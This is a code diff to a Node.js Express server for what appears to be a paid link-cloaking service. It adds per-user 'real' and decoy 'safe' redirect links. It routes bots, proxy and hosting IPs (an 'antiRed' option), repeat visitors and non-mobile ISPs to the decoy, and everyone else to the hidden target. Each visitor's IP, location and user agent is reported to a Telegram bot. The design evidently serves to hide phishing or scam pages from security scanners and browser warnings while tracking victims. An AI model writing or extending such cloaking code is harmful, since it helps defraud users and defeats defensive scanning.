@@ -200,6 +200,52 @@ app.post('/api/forced-ips', requireAuth, asyncHandler(async (req, res) => {
     res.json({ message: 'IP added' });
 }));
 
+app.get('/api/links', requireAuth, asyncHandler(async (req, res) => {
+    res.json(req.user.links || []);
+}));
+
+app.post('/api/links', requireAuth, asyncHandler(async (req, res) => {
+    const { name, realLink, nonRealLink, slug } = req.body;
+    if (!name || !realLink || !nonRealLink) {
+        return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
+    }
+
+    const newSlug = slug || require('crypto').randomBytes(4).toString('hex');
+    
+    // Validate slug (alphanumeric and dashes only)
+    if (slug && !/^[a-zA-Z0-9-]+$/.test(slug)) {
+        return res.status(400).json({ error: 'Slug can only contain letters, numbers, and dashes' });
+    }
+
+    // Check if slug is already taken
+    const existing = await db.findUserBySlug(newSlug);
+    if (existing) {
+        return res.status(400).json({ error: 'Slug already in use' });
+    }
+
+    const newLink = {
+        id: require('uuid').v4(),
+        name,
+        realLink,
+        nonRealLink,
+        slug: newSlug,
+        createdAt: new Date().toISOString()
+    };
+
+    const updatedUser = await db.updateUser(req.user.id, {
+        links: [...(req.user.links || []), newLink]
+    });
+
+    res.json(newLink);
+}));
+
+app.delete('/api/links/:slug', requireAuth, asyncHandler(async (req, res) => {
+    const { slug } = req.params;
+    const updatedLinks = (req.user.links || []).filter(l => l.slug !== slug);
+    await db.updateUser(req.user.id, { links: updatedLinks });
+    res.json({ message: 'Link deleted' });
+}));
+
 app.delete('/api/forced-ips/:ip', requireAuth, asyncHandler(async (req, res) => {
     const { ip } = req.params;
     await db.updateUser(req.user.id, { forcedIps: req.user.forcedIps.filter(i => i !== ip) });
@@ -250,11 +296,11 @@ function isBot(req) {
 }
 
 app.get('/l/:slug', async (req, res) => {
-    const user = await db.findUserBySlug(req.params.slug);
-    if (!user || user.wallet <= 0) {
+    const result = await db.findUserBySlug(req.params.slug);
+    if (!result || !result.user || result.user.wallet <= 0) {
         return res.status(404).send('Not Found or Account Inactive');
     }
-    return handleRedirection(user, req, res);
+    return handleRedirection(result.user, req, res, result.link);
 });
 
 app.get('/u/:userId', async (req, res) => {
@@ -262,10 +308,15 @@ app.get('/u/:userId', async (req, res) => {
     if (!user || user.wallet <= 0) {
         return res.status(404).send('Not Found or Account Inactive');
     }
-    return handleRedirection(user, req, res);
+    // Default link settings for legacy /u/ route
+    const defaultLink = {
+        realLink: user.settings.realLink,
+        nonRealLink: user.settings.nonRealLink
+    };
+    return handleRedirection(user, req, res, defaultLink);
 });
 
-async function handleRedirection(user, req, res) {
+async function handleRedirection(user, req, res, linkData) {
     if (!user.isActive) {
         return res.status(403).send('Account Suspended or Inactive');
     }
@@ -278,19 +329,22 @@ async function handleRedirection(user, req, res) {
     const clientIp = req.ip;
     const userAgent = req.headers['user-agent'] || 'Unknown';
 
+    const realLink = linkData.realLink || settings.realLink;
+    const nonRealLink = linkData.nonRealLink || settings.nonRealLink;
+
     if (isBot(req)) {
-        return res.redirect(settings.nonRealLink || '/');
+        return res.redirect(nonRealLink || '/');
     }
 
     // 1. Forced Redirect Check
     if (forcedIps.includes(clientIp)) {
-        return res.redirect(settings.realLink);
+        return res.redirect(realLink);
     }
 
     // 2. Visited IP Check
     const isVisited = visitedIps.some(v => v.ip === clientIp);
     if (isVisited && !settings.reallowVisited) {
-        return res.redirect(settings.nonRealLink);
+        return res.redirect(nonRealLink);
     }
 
     // 3. IP Analysis
@@ -307,21 +361,21 @@ async function handleRedirection(user, req, res) {
     const isSuspicious = isProxy || isHosting;
 
     // 4. Filtering Logic
-    let targetUrl = settings.realLink;
+    let targetUrl = realLink;
 
     if (settings.antiRed && isSuspicious) {
-        targetUrl = settings.nonRealLink;
+        targetUrl = nonRealLink;
     } else if (settings.ispFilter && data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
         const matches = settings.mobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
         if (!matches) {
-            targetUrl = settings.nonRealLink;
+            targetUrl = nonRealLink;
         }
     }
 
     // 5. Update Visited IPs
     if (!isVisited) {
-        const redirectType = targetUrl === settings.realLink ? 'REAL' : 'SAFE';
+        const redirectType = targetUrl === realLink ? 'REAL' : 'SAFE';
         const newVisited = [...visitedIps, { 
             ip: clientIp, 
             timestamp: Date.now(), 
@@ -338,7 +392,7 @@ async function handleRedirection(user, req, res) {
 
     if (botToken && chatId) {
         let message = `🚀 *SaaS Visit!* (User: ${user.name})\n\n`;
-        message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === settings.realLink ? 'REAL' : 'SAFE'}`;
+        message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === realLink ? 'REAL' : 'SAFE'}`;
         
         axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
